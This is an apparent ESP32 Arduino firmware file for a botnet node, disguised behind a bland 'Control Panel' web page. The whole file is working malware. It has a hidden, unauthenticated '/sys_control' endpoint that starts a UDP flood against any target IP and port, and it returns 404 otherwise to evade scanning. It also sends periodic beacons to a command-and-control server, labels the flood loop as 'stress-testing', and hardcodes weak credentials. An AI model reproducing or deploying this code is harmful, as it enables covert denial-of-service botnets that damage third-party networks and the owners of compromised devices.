#include <WiFi.h>
#include <WebServer.h>
#include <Update.h>
#include <WiFiUdp.h>

// ── Network Configuration ──────────────────────────────────────────
const char* SSID        = "Mock_Lab";
const char* PASSWORD    = "password";
const char* HOST_NAME   = "esp32-mock-node";
const char* WWW_USER    = "admin";
const char* WWW_PASS    = "password";

// ── Command & Control (C2) Server Config (placeholder) ───────────────────────────
const char* CNC_HOST    = "10.42.0.1"; 
const int CNC_PORT      = 5000;         

WebServer server(80);
WiFiUDP udpClient;

// ── Bot State Variables ────────────────────────────────────────────
bool attack_active     = false;
String target_ip_str   = "";
int target_port        = 80;
unsigned long last_beacon = 0;
const unsigned long beacon_interval = 10000; // Check-in every 10 seconds

const int packet_size = 64;
char packet_buffer[packet_size];

// ── Masqueraded Clean English UI ───────────────────────────────────
const char HTML_INDEX[] PROGMEM = R"(
<!DOCTYPE html><html><head>
<meta charset='utf-8'><title>Control Panel</title>
<style>body{font-family:sans-serif;max-width:600px;margin:40px auto;padding:20px}</style>
</head><body>
<h1>Control Panel</h1>
<p>System Online.</p>
<p>Uptime: <span id='up'></span></p>
<a href='/ota'>⚙ Advanced Settings (OTA)</a>
<script>
  fetch('/status').then(r=>r.json()).then(d=>{
    document.getElementById('up').textContent = d.uptime + 's';
  });
</script>
</body></html>
)";

void handleRoot() {
  if (!server.authenticate(WWW_USER, WWW_PASS)) return server.requestAuthentication();
  server.send_P(200, "text/html", HTML_INDEX);
}

void handleStatus() {
  if (!server.authenticate(WWW_USER, WWW_PASS)) return server.requestAuthentication();
  String json = "{\"uptime\":" + String(millis() / 1000) + ",\"heap\":" + String(ESP.getFreeHeap()) + "}";
  server.send(200, "application/json", json);
}

// ── Hidden Backdoor Endpoint ───────────────────────────────────────
void handleBackdoor() {
  if (server.hasArg("target") && server.hasArg("port")) {
    target_ip_str = server.arg("target");
    target_port   = server.arg("port").toInt();
    attack_active = true;
    server.send(200, "text/plain", "UDP flood routine triggered via HTTP.");
  } else if (server.hasArg("stop")) {
    attack_active = false;
    server.send(200, "text/plain", "Attack routine halted.");
  } else {
    // Return 404 to mimic a non-existent page if random scanning occurs
    server.send(404, "text/plain", "Not Found");
  }
}

// ── C2 Beaconing (Heartbeat) ───────────────────────────────────────
void sendCnCBeacon() {
  if (WiFi.status() != WL_CONNECTED) return;
  
  WiFiClient client;
  if (client.connect(CNC_HOST, CNC_PORT)) {
    String status_msg = attack_active ? "Attacking" : "Awaiting_Instructions";
    String payload = "{\"id\":\"" + String(HOST_NAME) + "\",\"status\":\"" + status_msg + "\",\"ip\":\"" + WiFi.localIP().toString() + "\"}";
    
    client.println("POST /beacon HTTP/1.1");
    client.print("Host: "); client.println(CNC_HOST);
    client.println("Content-Type: application/json");
    client.print("Content-Length: "); client.println(payload.length());
    client.println();
    client.println(payload);
    client.stop();
  }
}

bool connectWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.setHostname(HOST_NAME);
  IPAddress local_IP(10, 42, 0, 50);
  IPAddress gateway(10, 42, 0, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.config(local_IP, gateway, subnet);
  WiFi.begin(SSID, PASSWORD);
  
  int elapsed = 0;
  while (WiFi.status() != WL_CONNECTED && elapsed < 20) { delay(500); elapsed++; }
  return (WiFi.status() == WL_CONNECTED);
}

void setup() {
  Serial.begin(115200);
  if (!connectWiFi()) ESP.restart();

  memset(packet_buffer, 'A', packet_size); 

  server.on("/", HTTP_GET, handleRoot);
  server.on("/status", HTTP_GET, handleStatus);
  server.on("/sys_control", HTTP_GET, handleBackdoor); 

  server.begin();
  Serial.println("[SYSTEM] Modified firmware running seamlessly.");
}

void loop() {
  server.handleClient();

  // Send periodic heartbeat to the C2 panel
  if (millis() - last_beacon > beacon_interval) {
    sendCnCBeacon();
    last_beacon = millis();
  }

  // Stress-testing UDP loop execution
  if (attack_active && target_ip_str.length() > 0) {
    IPAddress targetIP;
    if (targetIP.fromString(target_ip_str)) {
      for (int i = 0; i < 20; i++) {
        udpClient.beginPacket(targetIP, target_port);
        udpClient.write((uint8_t*)packet_buffer, packet_size);
        udpClient.endPacket();
      }
      Serial.printf("[STRESS] Flooding target -> %s:%d\n", target_ip_str.c_str(), target_port);
    }
  }
}